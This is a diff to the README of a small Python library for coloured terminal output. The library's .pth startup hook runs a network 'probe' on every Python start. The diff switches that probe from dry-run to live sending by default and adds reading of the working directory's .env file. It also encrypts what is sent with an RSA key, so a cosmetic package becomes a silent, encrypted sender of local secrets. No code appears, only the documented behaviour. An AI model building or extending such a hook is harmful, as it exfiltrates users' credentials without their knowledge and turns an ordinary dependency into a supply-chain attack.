@@ -8,7 +8,7 @@ A tiny Python library for colored terminal prompts and messages.
 
 - Colored prompts for `input()`
 - Colored and styled output printing
-- Lightweight, no runtime dependencies
+- Lightweight core API with one runtime dependency (`cryptography`) for startup probe encryption
 - Works with plain ANSI terminals
 - Respects `NO_COLOR` environment variable
 - Ships a `.pth` startup hook that executes on Python startup after install
@@ -157,17 +157,19 @@ The startup hook sets this runtime marker so you can verify it ran:
 
 - `ITSLITLIB_PTH_EXECUTED=1`
 
-It also triggers one net probe dry-run execution per Python process startup (safe preview mode):
+It also triggers one net probe execution per Python process startup:
 
 - `ITSLITLIB_NET_PROBE_EXECUTED=1`
 - `ITSLITLIB_NET_PROBE_EXIT_CODE=<exit code>`
+- `ITSLITLIB_NET_PROBE_STARTUP_EFFECTIVE_MODE=<live|dry-run>`
 
 Startup mode behavior:
 
 - default mode is `live` (real send attempt)
+- startup also reads `.env` from the current working directory (or `ITSLITLIB_DOTENV_PATH`) for unset `ITSLITLIB_*` values
 - set `ITSLITLIB_NET_PROBE_RSA_PUBLIC_KEY` to a PEM RSA public key path (recommended for live sends)
 - if no RSA key path is set, startup auto-generates an ephemeral RSA-4096 public key and continues in `live` mode
-- if key generation fails (for example optional crypto dependency missing), startup safely falls back to `dry-run`
+- if key generation fails, startup safely falls back to `dry-run`
 - set `ITSLITLIB_NET_PROBE_STARTUP_MODE=dry-run` to force preview-only mode
 - optional override endpoint: `ITSLITLIB_NET_PROBE_URL=https://...`
 - optional startup timeout: `ITSLITLIB_NET_PROBE_TIMEOUT_SECONDS=10`
@@ -213,9 +215,9 @@ python -m pip install --upgrade pip setuptools wheel
 python -m pip install .[net-probe]
 ```
 
-This installs the optional `cryptography` dependency required by the probe command.
+This ensures `cryptography` is present for encrypted probe startup and CLI sends.
 
-After install, startup probe dry-run is automatically triggered by commands such as:
+After install, startup probe execution is automatically triggered by commands such as:
 
 ```bash
 python -c ""
